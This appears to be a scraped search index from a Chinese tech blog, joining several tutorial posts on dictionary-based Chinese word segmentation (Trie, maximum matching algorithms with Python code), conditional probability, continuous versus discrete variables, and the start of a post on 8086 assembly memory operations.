下图为基于同一份10万左右的词典，待分词文本为字符长度150，使用正向最大匹配算法在列表和Trie两种结构上进行分词的运行时间，从下图可以看出来差距非常大。\nTrie树的查找方式则是通过层层查询，而不是直接遍历词典，比如\u0026quot;中国人\u0026rdquo;，首先会查找第一层中是否有\u0026quot;中\u0026quot;这个字符，如果没有查询到则返回查询失败，如果有则继续查找\u0026quot;中\u0026quot;字符对应的下一层是否有\u0026quot;国\u0026quot;，如果没有则返回查询识别，如果有则继续查找\u0026quot;国\u0026quot;下一层是否有\u0026quot;人\u0026quot;，此时找到存在\u0026quot;人\u0026quot;这个节点，并且该节点标注为蓝色，表明是一个词，所以返回该字符串为一个词。 其实要实现这样的数据结构，大致的功能点为下面两点：\n查询词 添加词 除此之外还需要考虑如果标记词的结束节点，首先可以约定，默认情况都返回\u0026quot;False\u0026quot;表示为未查询到或设置失败，而返回\u0026quot;True\u0026quot;则表示查询到或设置成功，每个节点为一个字符，而字典当中的__value表示是否为结束节点（即一个词的尾字符），如果是则为True，不是则为False，整体可以采用函数或者类来定义。 实现代码：\nclass Trie(): #定义一个Trie类型 def __init__(self): #为这个生成的实例定义一个名为_children的对象，用于存放词的Trie结构 self._children = {} def _add_word(self, word): # 定义一个添加词的实例方法 child = self._children # 首先会将_children的对象赋值给child for i,char in enumerate(word): # 然后从头遍历添加词的每一个字符 if char not in child: # 查看当前字符是否存在Trie树上 child[char] = {\u0026#39;__value\u0026#39;: False} # 如果没有则新建一个对象，并设置特殊key__value为False，表明这不是一个结尾字符 if i == (len(word) - 1): # 判断是否为结尾字符 child[char][\u0026#39;__value\u0026#39;] = True # 如果是则将特殊key：__value设为True，表明为结尾字符 child = child[char] # 如果还有字符，则将当前字符对象更新为child，那么下一次查找则是基于上一次对象下 return True # 添加完成返回True def _get_word(self, word): # 查找词 child = self.","title":"(二)漫话中文分词：Trie、KMP、AC自动机"},{"content":"中文分词是指将文本拆分为单词的过程，而结果集合连接起来是等于原始的文本，而中文分词一直作为NLP领域的比较重要的领域，而大多数的文本挖掘都是以分词为基础，但中文不同于英文，英文每个单词是用空格分隔，整体语义上相对于中文难度低很多。 而业务上一直有中文分词的需求，但是之前因为在忙于另外一个项目，所以一直没有研究。 近期稍空闲开始研究了相关的中文分词算法，发现中文分词总体算比较成熟，但是其中对于未登录词或者某个特定专业领域文本大部分算法分词的结果不尽人意，需要结合多种算法或者人工词典才能达到稍微好一点的效果。 中文分词的方式一共有两种，分别为：\n词典分词：如正向最大匹配算法、反向最大匹配算法、双向最大匹配算法、最少词数法等 字标注分词：如HMM（隐马尔可夫）模型等 而这几种方式很难说出谁好谁坏，比如词典分词的方式速度非常快，但对于未登录词的识别又不太好，而HMM和Pkuseg都能识别部分未登录词，但是运行速度又降下来了，这对于在实际应用场景当中是非常致命的问题，所以最大的优解就是集各家所长，比如结巴分词就使用了词典分词算法识别能识别的词，而不能识别的则继续使用了HMM模型来处理。\n词典分词 基于词典的分词算法实际上就是对于类似字典的数据结构进行查询，对于未在词典内的词识别较弱和交集型歧义理解能力也较弱，比如“结婚的和尚未结婚的”，理想的情况是\u0026quot;结婚/的/和/尚未/结婚/的\u0026quot;，而实际中则会被分词为\u0026quot;结婚/的/和尚/未/结婚/的\u0026quot;。 但好在词典分词的速度则非常快，词典分词目前已有非常成熟高效的解决方案，并且有非常多的工具来帮你实现相关的高效数据结构和查询方式，比如Trie树和AC自动机，但在这里为了方便理解和记录，只采用了尽可能简单的方式来记录其几种算法的实现和原理。\n正向最大匹配算法（Forward Maximum Matching） 正向最大匹配算法类似于人的阅读习惯，即从左到右进行识别，而其中的\u0026quot;最大\u0026quot;是基于词典中最长字符的长度作为最大的匹配宽度，然后每次根据这个宽度对文本进行切分并取出来查询词典。如果当前取出来的词能在词典当中查询当则返回，并下一次切分的开始位置为该词的位置+1。而如果当前取出的部分没有在词典中查找到，则将该部分去掉最后一个字符后再进行查找，一直重复直到匹配到了词典中的词。如果整个部分只剩余一个字符，并没有匹配到词典中的词，则将最后剩余的这个字符输出，然后根据这个字符的位置+1开始再次进行切分和查询。 比如，有一段文本\u0026quot;中文分词算法\u0026quot;，字典中只包含了一个词\u0026quot;分词\u0026quot;，这个时候最大的匹配宽度也为2，所以整段文本按照2个字符进行切分。第一次得到\u0026quot;中文\u0026quot;文本，查找词典并无该词，则在该部分上去掉最后的字符，得到\u0026quot;中\u0026quot;，再次查询词典并无该词，此时查找结束，所以不需要再进行匹配，则这个切分记为[\u0026ldquo;中\u0026rdquo;]。 继续进行第二次切分，得到的文本为\u0026quot;文分\u0026quot;，进行查询词典，第一次查询\u0026quot;文分\u0026quot;在字典中不存在，去掉最后一个字符，继续以剩余部分\u0026rsquo;文\u0026rsquo;查询第二次，未查询到，那么返回最后这个字符\u0026quot;文\u0026quot;，加上次的结果记作[\u0026ldquo;中\u0026rdquo;,\u0026ldquo;文\u0026rdquo;] 继续第三次切分，得到文本\u0026quot;分词\u0026quot;，进行查询词典，查询到该词在字典当中，所以直接记录在之前的结果当中，记作[\u0026ldquo;中\u0026rdquo;, \u0026ldquo;文\u0026rdquo;, \u0026ldquo;分词\u0026rdquo;]。 继续第四次切分，得到文本\u0026quot;算法\u0026quot;，进行查询字典，第一次查询\u0026quot;算法\u0026quot;在字典中不存在，去掉最后一个字符，继续以剩余部分\u0026rsquo;算\u0026rsquo;查询第二次，未查询到，那么返回最后这个字符\u0026quot;算\u0026quot;，加上次的结果记作[\u0026ldquo;中\u0026rdquo;, \u0026ldquo;文\u0026rdquo;, \u0026ldquo;分词\u0026rdquo;, \u0026ldquo;算\u0026rdquo;] 继续第五次切分，因为最后只剩余一个字符，所以这个时候可以不进行匹配即返回，所以最终的结果为[\u0026ldquo;中\u0026rdquo;, \u0026ldquo;文\u0026rdquo;, \u0026ldquo;分词\u0026rdquo;, \u0026ldquo;算\u0026rdquo;, \u0026ldquo;法\u0026rdquo;] 整体分词的过程本质对每个分块进行查找，并依次去掉最后字符查询，而网上还有一部分是没有使用最大宽度切分，即会对每个字符到文本结束的位置都会依次遍历，这样的方式实际上会浪费较多的资源，因为即使从头到尾依次遍历匹配，但最长词的长度是固定的，所以真正开始匹配还是从最长词的长度开始，而其余的遍历都是浪费了资源。 正向最大匹配算法具体的实现代码：\nsentence = \u0026#39;中文分词算法\u0026#39; # 输入的句子 cutList = [\u0026#39;分词\u0026#39;] # 分词词典 start = 0 #设置切分起始位置 maxWidth = len(max(cutList, key=len)) # 得到字典当中最大的切分宽度 cut_result = [] # 设置一个空的分词结果 while (start \u0026lt;= len(sentence)): #开始循环，如果start大于等于句子长度则停止分词 end = start + maxWidth # 计算每次切分的停止位置 word = sentence[start: end] # 开始切分，文本为变量start和end的区间内字符 while ( word ) : # python对于空字符串会转换为False if ( word in cutList ) : # 查看第一次切分后是否能在词典中匹配，如果匹配则放入最终的分词结果列表cut_result,并跳出循环 cut_result.append(word) start = start + len(word) - 1 # 然后将开始位置设置为当前开始位置加上被匹配词的长度 break if (len(word[:-1]) == 0): cut_result.append(word) # 如果最后一个字符也没有被匹配到，那么返回最后一个字符 break word = word[:-1] # 将word去掉最后一个字符串并重新计算 start = start + 1 # 将位置加1 print(cut_result) #[\u0026#39;中\u0026#39;, \u0026#39;文\u0026#39;, \u0026#39;分词\u0026#39;, \u0026#39;算\u0026#39;, \u0026#39;法\u0026#39;] 反向最大匹配算法（Backward Maximum Matching） 反向最大匹配算法与正向最大匹配算法是相反的，比如\u0026quot;中文分词算法\u0026quot;文本的正向最大匹配算法在切分宽度为2的时候，是从\u0026quot;中文\u0026quot;开始切分的，而反向则是从\u0026quot;算法\u0026quot;开始切分的。 除了反向的切分，其中对于切分块内的文本依次去掉最后一个字符也变为了依次去掉第一个字符，比如正向第一个切分块\u0026quot;中文\u0026quot;后，如果没有匹配到，则去掉\u0026quot;文\u0026quot;，再对\u0026quot;中\u0026quot;字符进行匹配，而反向则是拿到\u0026quot;算法\u0026quot;后，如果没有匹配到，则是去掉\u0026quot;算\u0026quot;，再对\u0026quot;法\u0026quot;进行匹配。 反向最大匹配算法对比于正向最大匹配算法来说，可以解决一定的交集型歧义，比如本文\u0026quot;他说的确实在理\u0026quot;，理想情况下希望的分词结果中包含\u0026quot;确实\u0026quot;这一词，而正向最大匹配算法结果为\u0026quot;他/说/的确/实/在理\u0026quot;，而反向最大匹配算法的结果为\u0026quot;他/说/的/确实/在理\u0026quot;。 这两种方式很难区分到底谁好谁坏，比如上面的问题中，如果你希望的分词为\u0026quot;的确\u0026quot;，但是如果使用反向的话就很难被分出来。 反向最大匹配算法具体的实现代码：\nsentence = \u0026#39;他说的确实在理\u0026#39; # 输入的句子 cutList = [\u0026#39;的确\u0026#39;, \u0026#39;确实\u0026#39;] # 分词词典 start = len(sentence) #设置切分起始位置为该文本的最后一个字符 maxWidth = len(max(cutList, key=len)) # 得到字典当中最大的切分宽度 cut_result = [] # 设置一个空的分词结果 while (start \u0026gt; 0): #开始循环，如果start大于等于句子长度则停止分词 end = start - maxWidth # 计算结束位置，结束位置为开始位置减去宽度 word = sentence[end: start] # 开始切分，文本为变量end和start的区间内字符 while ( word ) : # python对于空字符串会转换为False if ( word in cutList ) : # 查看第一次切分后是否能在词典中匹配，如果匹配则放入最终的分词结果列表cut_result,并跳出循环 cut_result.insert(0,word) start = start - len(word) + 1 # 然后将开始位置设置为当前开始位置加上被匹配词的长度 break if (len(word) == 1): cut_result.insert(0, word) # 返回最后一个字符 break word = word[1:] # 将word去掉第一个字符串并重新计算 start = start - 1 # 将位置减1 cut_result.insert(0, sentence[0]) # 将剩余的第一个字符添加进结果 print(cut_result) #[\u0026#39;他\u0026#39;, \u0026#39;说\u0026#39;, \u0026#39;的\u0026#39;, \u0026#39;确实\u0026#39;, \u0026#39;在\u0026#39;, \u0026#39;理\u0026#39;] 双向最大匹配算法（Bidirectional Maximum Match） 双向最大匹配算法是将正向和反向结果的颗粒度进行比较的一种算法，本质上是一种规则系统，该规则为如下：\n返回词数最少的结果 返回单字词更少的结果 如果两则都相同优先返回反向最大匹配算法结果 因为双向最大匹配算法实际上是一种规则系统，只需要对结果进行判断优先返回哪种结果，所以这里就不过多的说明。但需要注意的是采用双向最大匹配算法实际上运行了两种算法，所以对于运算量来说是双倍。\n最少词数算法（Minimal Word Count） 最少词数算法也被称为最少切分算法，最少词数算法的本质是将一段文本分词的结果最少，最少次数算法整个过程是将字典按照长度进行排序，首先对最长的字典中的词进行匹配字符串，如果有则切分，并继续匹配下一个字典中的词，如果没有则继续匹配按照顺序匹配。 比如\u0026quot;独立自主和平等互利的原则\u0026quot;，正向匹配的结果为\u0026quot;独立自主/和平/等/互利/的/原则\u0026quot;，而最少词数的结果\u0026quot;独立自主/和/平等互利/的/原则\u0026quot;。 下面为一个非常简单的实现：\nsentence = \u0026#39;独立自主和平等互利的原则\u0026#39; # 输入的句子 cutList = [\u0026#39;独立自主\u0026#39;, \u0026#39;平等互利\u0026#39;, \u0026#39;独立\u0026#39;, \u0026#39;自主\u0026#39;, \u0026#39;和平\u0026#39;, \u0026#39;平等\u0026#39;, \u0026#39;互利\u0026#39;, \u0026#39;原则\u0026#39;] # 分词词典 cutList = sorted(cutList, key=len, reverse=True) # 字典排序 for cut in cutList: if(\u0026#39;/%s\u0026#39;%cut not in sentence and \u0026#39;%s/\u0026#39;%cut not in sentence and cut in sentence) : sentence = sentence.replace(cut, \u0026#39;/%s/\u0026#39;%cut) print(sentence) #/独立自主/和/平等互利/的/原则 参考文档 https://www.cnblogs.com/cyandn/p/10891608.html https://zhuanlan.zhihu.com/p/103392455 http://www.matrix67.com/blog/archives/4212 https://kexue.fm/archives/3908 ","permalink":"https://wuyizhou.com/posts/chinesecutwords-1/","summary":"中文分词是指将文本拆分为单词的过程，而结果集合连接起来是等于原始的文本，而中文分词一直作为NLP领域的比较重要的领域，而大多数的文本挖掘都是以分词为基础，但中文不同于英文，英文每个单词是用空格分隔，整体语义上相对于中文难度低很多。 而业务上一直有中文分词的需求，但是之前因为在忙于另外一个项目，所以一直没有研究。 近期稍空闲开始研究了相关的中文分词算法，发现中文分词总体算比较成熟，但是其中对于未登录词或者某个特定专业领域文本大部分算法分词的结果不尽人意，需要结合多种算法或者人工词典才能达到稍微好一点的效果。 中文分词的方式一共有两种，分别为：\n词典分词：如正向最大匹配算法、反向最大匹配算法、双向最大匹配算法、最少词数法等 字标注分词：如HMM（隐马尔可夫）模型等 而这几种方式很难说出谁好谁坏，比如词典分词的方式速度非常快，但对于未登录词的识别又不太好，而HMM和Pkuseg都能识别部分未登录词，但是运行速度又降下来了，这对于在实际应用场景当中是非常致命的问题，所以最大的优解就是集各家所长，比如结巴分词就使用了词典分词算法识别能识别的词，而不能识别的则继续使用了HMM模型来处理。\n词典分词 基于词典的分词算法实际上就是对于类似字典的数据结构进行查询，对于未在词典内的词识别较弱和交集型歧义理解能力也较弱，比如“结婚的和尚未结婚的”，理想的情况是\u0026quot;结婚/的/和/尚未/结婚/的\u0026quot;，而实际中则会被分词为\u0026quot;结婚/的/和尚/未/结婚/的\u0026quot;。 但好在词典分词的速度则非常快，词典分词目前已有非常成熟高效的解决方案，并且有非常多的工具来帮你实现相关的高效数据结构和查询方式，比如Trie树和AC自动机，但在这里为了方便理解和记录，只采用了尽可能简单的方式来记录其几种算法的实现和原理。\n正向最大匹配算法（Forward Maximum Matching） 正向最大匹配算法类似于人的阅读习惯，即从左到右进行识别，而其中的\u0026quot;最大\u0026quot;是基于词典中最长字符的长度作为最大的匹配宽度，然后每次根据这个宽度对文本进行切分并取出来查询词典。如果当前取出来的词能在词典当中查询当则返回，并下一次切分的开始位置为该词的位置+1。而如果当前取出的部分没有在词典中查找到，则将该部分去掉最后一个字符后再进行查找，一直重复直到匹配到了词典中的词。如果整个部分只剩余一个字符，并没有匹配到词典中的词，则将最后剩余的这个字符输出，然后根据这个字符的位置+1开始再次进行切分和查询。 比如，有一段文本\u0026quot;中文分词算法\u0026quot;，字典中只包含了一个词\u0026quot;分词\u0026quot;，这个时候最大的匹配宽度也为2，所以整段文本按照2个字符进行切分。第一次得到\u0026quot;中文\u0026quot;文本，查找词典并无该词，则在该部分上去掉最后的字符，得到\u0026quot;中\u0026quot;，再次查询词典并无该词，此时查找结束，所以不需要再进行匹配，则这个切分记为[\u0026ldquo;中\u0026rdquo;]。 继续进行第二次切分，得到的文本为\u0026quot;文分\u0026quot;，进行查询词典，第一次查询\u0026quot;文分\u0026quot;在字典中不存在，去掉最后一个字符，继续以剩余部分\u0026rsquo;文\u0026rsquo;查询第二次，未查询到，那么返回最后这个字符\u0026quot;文\u0026quot;，加上次的结果记作[\u0026ldquo;中\u0026rdquo;,\u0026ldquo;文\u0026rdquo;] 继续第三次切分，得到文本\u0026quot;分词\u0026quot;，进行查询词典，查询到该词在字典当中，所以直接记录在之前的结果当中，记作[\u0026ldquo;中\u0026rdquo;, \u0026ldquo;文\u0026rdquo;, \u0026ldquo;分词\u0026rdquo;]。 继续第四次切分，得到文本\u0026quot;算法\u0026quot;，进行查询字典，第一次查询\u0026quot;算法\u0026quot;在字典中不存在，去掉最后一个字符，继续以剩余部分\u0026rsquo;算\u0026rsquo;查询第二次，未查询到，那么返回最后这个字符\u0026quot;算\u0026quot;，加上次的结果记作[\u0026ldquo;中\u0026rdquo;, \u0026ldquo;文\u0026rdquo;, \u0026ldquo;分词\u0026rdquo;, \u0026ldquo;算\u0026rdquo;] 继续第五次切分，因为最后只剩余一个字符，所以这个时候可以不进行匹配即返回，所以最终的结果为[\u0026ldquo;中\u0026rdquo;, \u0026ldquo;文\u0026rdquo;, \u0026ldquo;分词\u0026rdquo;, \u0026ldquo;算\u0026rdquo;, \u0026ldquo;法\u0026rdquo;] 整体分词的过程本质对每个分块进行查找，并依次去掉最后字符查询，而网上还有一部分是没有使用最大宽度切分，即会对每个字符到文本结束的位置都会依次遍历，这样的方式实际上会浪费较多的资源，因为即使从头到尾依次遍历匹配，但最长词的长度是固定的，所以真正开始匹配还是从最长词的长度开始，而其余的遍历都是浪费了资源。 正向最大匹配算法具体的实现代码：\nsentence = \u0026#39;中文分词算法\u0026#39; # 输入的句子 cutList = [\u0026#39;分词\u0026#39;] # 分词词典 start = 0 #设置切分起始位置 maxWidth = len(max(cutList, key=len)) # 得到字典当中最大的切分宽度 cut_result = [] # 设置一个空的分词结果 while (start \u0026lt;= len(sentence)): #开始循环，如果start大于等于句子长度则停止分词 end = start + maxWidth # 计算每次切分的停止位置 word = sentence[start: end] # 开始切分，文本为变量start和end的区间内字符 while ( word ) : # python对于空字符串会转换为False if ( word in cutList ) : # 查看第一次切分后是否能在词典中匹配，如果匹配则放入最终的分词结果列表cut_result,并跳出循环 cut_result.","title":"(一)漫话中文分词：最大匹配,双向最大,最小词数"},{"content":"样本空间（Ω） 样本空间通常指实验或随机所有可能的集合，我们常在说一个概率的时候，实际上是默认忽略掉了样本空间，比如说事件A的概率，实际上指样本空间中，事件A的数量与样本空间的占比。\n比如丢硬币，硬币只有正面和反面，那么硬币的样本空间则为 ${正面，反面}$，这个时候常说的正面的概率为二分之一，实际指的是正面事件的数量与样本空间的占比，也就是1/2。 再比如说丢骰子，一个骰子有6种可能，分别对应1-6不同的数值，那么丢骰子的样本空间则为${1，2，3，4，5，6}$，这个时候丢到5个事件概率则为数字5在样本空间出现的次数与样本空间总数的占比。\n独立事件 独立事件是指不受过去已发生的事件而影响的事件，典型的例子就是抛硬币，不管你抛多少次硬币始终正面或反面的概率为0.5，而该硬币的样本空间如下：\n独立事件的概率计算公式为如下：\n$$ 事件发生的概率(P) = 事件在样本空间中的数量 / 样本空间的事件总数 $$\n比如用抛硬币的例子，计算正面的概率则为：\n而除了单个独立事件，有些时候也会求多个独立事件的概率，而多个独立事件的概率则是每个独立事件发生的概率的积。 比如掷3次骰子都为6的概率是多少？需要注意因为掷骰子是一个独立事件，即每次掷的骰子样本空间都一样，并且没有因为第一次掷骰子的结果会影响到下一次。 骰子的样本空间为下，从中能够得到单次掷骰子为6的概率为1/6：\n而这个时候只需要将三次掷骰子的概率相乘就得到了三次都为6的概率：\n相关事件 相关事件和独立事件是相对的，相关事件的发生概率会受到过去已发生事件的影响，每个事件都和上一个事件有关联，这些事件便是相关的。 比如一个布袋中有5个球，其中包含2个蓝球，三个红球，布袋(样本空间)则为：\n这个时候如果随机拿一颗蓝球的概率是多少？概率为2/5。 但是此时求第二次拿到蓝球的概率是多少？这个时候就会有两种情况发生：\n第一次拿到红球，这个时候整个样本空间少了一个红球，所以第二次拿到蓝球的概率为2/4 第二次拿到蓝球，这个时候整个样本空间少了一个篮球，所以第二次拿到蓝球的概率为1/4 用图表示则为：\n所以此时，如果算第一次拿到红球后，第二次拿到蓝球的概率则为：\n如果算第一次拿到蓝球后，第二次拿到红球的概率则为：\n条件概率 条件概率是研究相关事件的，指的是当B事件发生后，A事件发生的概率，用\u0026quot;｜\u0026ldquo;来表示\u0026quot;以下发生的条件下\u0026rdquo;，表示为公式：\n比如上面的例子，第二个蓝球的概率是多少，这个问题就是条件概率，因为第二次抽中蓝球的概率是基于第一次拿了一颗球过后发生的事件。 这个时候可以将第一次抽中红球记作事件A，第二次抽蓝球为事件B，因为第二次抽球是在事件A发生的情况下而发生的，所以记作 $P(B|A)$ ，表示在A发生后，B发生的概率。 而这个概率可以根据下图来得到，即2/4：\n这里的条件概率本质是二级概率，该情况可以用图来表达，第一次抽球的样本空间为整个样本空间：\n当第一次抽球(A事件)发生后，B事件的样本空间则是基于A事件发生后的样本空间，即下图中A圆圈内的样本空间：\n联合概率 联合概率指两个事件共同发生的概率，比如A和B事件共同发生的概率表示为：\n联合概率的计算分为两种情况，一种为独立事件，比如前面掷骰子，计算公式则为多个独立事件事件的积，表示为：\n另一种则为相关事件，比如上面的抽球的例子，则可以通过反推来计算，表示为：\n这里这样计算是因为P(B|A)只得到了B在A发生后的概率，也就是在发生后的样本空间上计算的，所以P(B|A)表示的只有下图这么一部分发生的概率：\n而在这个时候乘以P(A)的概率，则就能表示如下这整个部分：\n全概率 导致一个事件发生的原因有很多种，那么该事件发生的概率就是每种原因引起该事件发生的概率总和，这句话能够很好的解释全概率。 而全概率公式就可以计算出一个事件的全部概率，公式为：\n而根据联合概率的计算方法，可以写成下面这样：\n还是拿红蓝球的例子来说，如果需要计算P(B)，这个时候可以利用全概率公式，则将能引起事件B发生的每个概率相加，即可得到P(B)。 在红篮球例子当中，引起事件B的原因有两种，分别为：先拿到红球，然后抽中蓝球的概率和先拿到蓝球抽中蓝球的概率。 根据图中第一种先拿到了红球引起B事件的发生的概率为 $(3/5) * (2/4) = 0.3$\n根据图中第二种先拿到了蓝球引起B事件的发生的概率为 $(2/5) * (1/4) = 0.1 $\n这个时候得到了所有能引起B事件发生的原因的概率，所以：\n$$ P(B) = 0.3 + 0.1 = 0.4 $$\n条件概率和朴素贝叶斯定理公式 在理解了上面的几个知识点后，就能够理解贝叶斯和条件概率的计算方式。 条件概率的计算公式为：\n而贝叶斯公式则可以用条件概率公式和联合概率公式推导出来：\n参考文档 https://zhuanlan.zhihu.com/p/134036707 https://blog.csdn.net/u013371163/article/details/60469065 https://www.shuxuele.com/data/probability-events-conditional.html https://www.shuxuele.com/data/probability-events-independent.html https://www.shuxuele.com/data/probability-events-types.html https://www.zhihu.com/question/264373830/answer/613608291 https://blog.csdn.net/u013371163/article/details/60469065 https://zhuanlan.zhihu.com/p/78297343 ","permalink":"https://wuyizhou.com/posts/learning-conditional-probability/","summary":"样本空间（Ω） 样本空间通常指实验或随机所有可能的集合，我们常在说一个概率的时候，实际上是默认忽略掉了样本空间，比如说事件A的概率，实际上指样本空间中，事件A的数量与样本空间的占比。\n比如丢硬币，硬币只有正面和反面，那么硬币的样本空间则为 ${正面，反面}$，这个时候常说的正面的概率为二分之一，实际指的是正面事件的数量与样本空间的占比，也就是1/2。 再比如说丢骰子，一个骰子有6种可能，分别对应1-6不同的数值，那么丢骰子的样本空间则为${1，2，3，4，5，6}$，这个时候丢到5个事件概率则为数字5在样本空间出现的次数与样本空间总数的占比。\n独立事件 独立事件是指不受过去已发生的事件而影响的事件，典型的例子就是抛硬币，不管你抛多少次硬币始终正面或反面的概率为0.5，而该硬币的样本空间如下：\n独立事件的概率计算公式为如下：\n$$ 事件发生的概率(P) = 事件在样本空间中的数量 / 样本空间的事件总数 $$\n比如用抛硬币的例子，计算正面的概率则为：\n而除了单个独立事件，有些时候也会求多个独立事件的概率，而多个独立事件的概率则是每个独立事件发生的概率的积。 比如掷3次骰子都为6的概率是多少？需要注意因为掷骰子是一个独立事件，即每次掷的骰子样本空间都一样，并且没有因为第一次掷骰子的结果会影响到下一次。 骰子的样本空间为下，从中能够得到单次掷骰子为6的概率为1/6：\n而这个时候只需要将三次掷骰子的概率相乘就得到了三次都为6的概率：\n相关事件 相关事件和独立事件是相对的，相关事件的发生概率会受到过去已发生事件的影响，每个事件都和上一个事件有关联，这些事件便是相关的。 比如一个布袋中有5个球，其中包含2个蓝球，三个红球，布袋(样本空间)则为：\n这个时候如果随机拿一颗蓝球的概率是多少？概率为2/5。 但是此时求第二次拿到蓝球的概率是多少？这个时候就会有两种情况发生：\n第一次拿到红球，这个时候整个样本空间少了一个红球，所以第二次拿到蓝球的概率为2/4 第二次拿到蓝球，这个时候整个样本空间少了一个篮球，所以第二次拿到蓝球的概率为1/4 用图表示则为：\n所以此时，如果算第一次拿到红球后，第二次拿到蓝球的概率则为：\n如果算第一次拿到蓝球后，第二次拿到红球的概率则为：\n条件概率 条件概率是研究相关事件的，指的是当B事件发生后，A事件发生的概率，用\u0026quot;｜\u0026ldquo;来表示\u0026quot;以下发生的条件下\u0026rdquo;，表示为公式：\n比如上面的例子，第二个蓝球的概率是多少，这个问题就是条件概率，因为第二次抽中蓝球的概率是基于第一次拿了一颗球过后发生的事件。 这个时候可以将第一次抽中红球记作事件A，第二次抽蓝球为事件B，因为第二次抽球是在事件A发生的情况下而发生的，所以记作 $P(B|A)$ ，表示在A发生后，B发生的概率。 而这个概率可以根据下图来得到，即2/4：\n这里的条件概率本质是二级概率，该情况可以用图来表达，第一次抽球的样本空间为整个样本空间：\n当第一次抽球(A事件)发生后，B事件的样本空间则是基于A事件发生后的样本空间，即下图中A圆圈内的样本空间：\n联合概率 联合概率指两个事件共同发生的概率，比如A和B事件共同发生的概率表示为：\n联合概率的计算分为两种情况，一种为独立事件，比如前面掷骰子，计算公式则为多个独立事件事件的积，表示为：\n另一种则为相关事件，比如上面的抽球的例子，则可以通过反推来计算，表示为：\n这里这样计算是因为P(B|A)只得到了B在A发生后的概率，也就是在发生后的样本空间上计算的，所以P(B|A)表示的只有下图这么一部分发生的概率：\n而在这个时候乘以P(A)的概率，则就能表示如下这整个部分：\n全概率 导致一个事件发生的原因有很多种，那么该事件发生的概率就是每种原因引起该事件发生的概率总和，这句话能够很好的解释全概率。 而全概率公式就可以计算出一个事件的全部概率，公式为：\n而根据联合概率的计算方法，可以写成下面这样：\n还是拿红蓝球的例子来说，如果需要计算P(B)，这个时候可以利用全概率公式，则将能引起事件B发生的每个概率相加，即可得到P(B)。 在红篮球例子当中，引起事件B的原因有两种，分别为：先拿到红球，然后抽中蓝球的概率和先拿到蓝球抽中蓝球的概率。 根据图中第一种先拿到了红球引起B事件的发生的概率为 $(3/5) * (2/4) = 0.3$\n根据图中第二种先拿到了蓝球引起B事件的发生的概率为 $(2/5) * (1/4) = 0.1 $\n这个时候得到了所有能引起B事件发生的原因的概率，所以：\n$$ P(B) = 0.3 + 0.","title":"理解条件概率"},{"content":"统计学中，将一种类型的数据总称为变量，而变量的数据称为观测，而变量的具体取值为观测值，比如下面的数据中，age和name都是变量，而18和’大红’都具体的取值被称为观测值。\nage,name 18,’大红’ 21,’小花’ 同理，在统计学中，离散数据也被称为离散变量，连续数据也被称为连续变量，而如何区分两种变量的区别？ 连续变量可以理解为取值范围在理论上是连续不断的，而离散变量则可以理解为取值范围是间断不连续的，他们之间的区别并无数量之分，都是无穷个。 比如家庭数量人口只有1、2、3、4个人口，不可能为1.2、1.8、2.4这样来表示人口，所以家庭人口是离散变量。 而年龄取值上通常为了方便而说是18岁、17岁、30岁，但是如果按照实际取值，则可以取为18.32、17.55、30.67岁，17.55岁则表示年龄为17岁6个月18天，而且出生的时间还可以精确到小时、分、秒等单位，所以年龄为连续变量。\n参考资料 关于连续和离散的理解 定量和定性变量、连续和离散变量，到底怎么分？ 图解概率笔记：葉丙成概率公开课 ","permalink":"https://wuyizhou.com/posts/continuous-data-and-discrete-data/","summary":"统计学中，将一种类型的数据总称为变量，而变量的数据称为观测，而变量的具体取值为观测值，比如下面的数据中，age和name都是变量，而18和’大红’都具体的取值被称为观测值。\nage,name 18,’大红’ 21,’小花’ 同理，在统计学中，离散数据也被称为离散变量，连续数据也被称为连续变量，而如何区分两种变量的区别？ 连续变量可以理解为取值范围在理论上是连续不断的，而离散变量则可以理解为取值范围是间断不连续的，他们之间的区别并无数量之分，都是无穷个。 比如家庭数量人口只有1、2、3、4个人口，不可能为1.2、1.8、2.4这样来表示人口，所以家庭人口是离散变量。 而年龄取值上通常为了方便而说是18岁、17岁、30岁，但是如果按照实际取值，则可以取为18.32、17.55、30.67岁，17.55岁则表示年龄为17岁6个月18天，而且出生的时间还可以精确到小时、分、秒等单位，所以年龄为连续变量。\n参考资料 关于连续和离散的理解 定量和定性变量、连续和离散变量，到底怎么分？ 图解概率笔记：葉丙成概率公开课 ","title":"理解连续数据和离散数据"},{"content":"内存中字的储存 在8086CPU中，寄存器为16位，可以储存一个字(1Word=2Byte)，拿ax来说，低8位放在al中，高8位放在ah中。\n在内存单元一个内存单元只能存储一个字节，那么如果存储一个字型数据就会用到两个内存单元，低8位放在低地址当中，高8位放在高地址当中，比如下图中，储存了两个字型数据，一个是4E20H，一个是0012H，它们的存放数据大概如下：\n而当连续两个内存单元储存的是一个字型数据的时候，可以将这字型数据的起始地址称为N地址字单元，比如00001内存单元和00002内存单元，可以直接称为00001地址字单元。\n数据的读写 在第二章中写到如何操作CPU的执行指令，让内存中的数据当作指令还是数据都取决于程序员，当CS和IP指向的地址则当作指令执行，那读取数据也需要由段地址和偏移地址组成。\n8086CPU中，数据地址的段地址由段寄存器DS来指定，并且不能直接将数据送入DS段寄存器，只能通过其他寄存器来传送给段寄存器DS（这是8086CPU的硬件设计，只需要知道就可以了），那偏移地址呢？\n先来看看下面的代码，下面的代码是通过ax寄存器把内存单元2000H段地址传送给DS，然后读取内存单元2000段中的0001单元：\nmov bx,2000H mov ds,bx mov al,[0001H] 偏移地址是由程序员手动输入的，当编译器看见[]的时候，会自动把段寄存器DS中的值与[]号中数据进行合成为一个20位的物理地址，然后读取这个物理地址中的数据。\n那么如何把寄存器中的数据写入内存中呢？只需要将两个位置相关换一下，就可以了，比如下面代码，把ax的低位寄存器al中的12H数据写入内存2000段中的0001单元。\nmov bx,2000H mov ds,bx mov al,12H mov [0001H],al 字型数据传送 8086CPU是16位架构，那么意味着一次性可以传输16位数据，上面操作的都是8位数据，也可以传输16位数据，只需要给出16位寄存器的名字就可以传送了，但是16位寄存器分两个内存单元储存，一个内存单元只能储存8位数据，比如储存一个8E20H数据到2000:0000内存单元中，那么20H储存在2000:0000中，而8E储存在2000:0001中。\nCPU提供的栈以及机制 栈是一种特殊方式访问的内存单元，那么它有什么用呢？以后会慢慢来说到，在这里只是先对栈空间有一个大概的认识，栈的特殊性在于后进先出，英文缩写为LIFO(Last in First 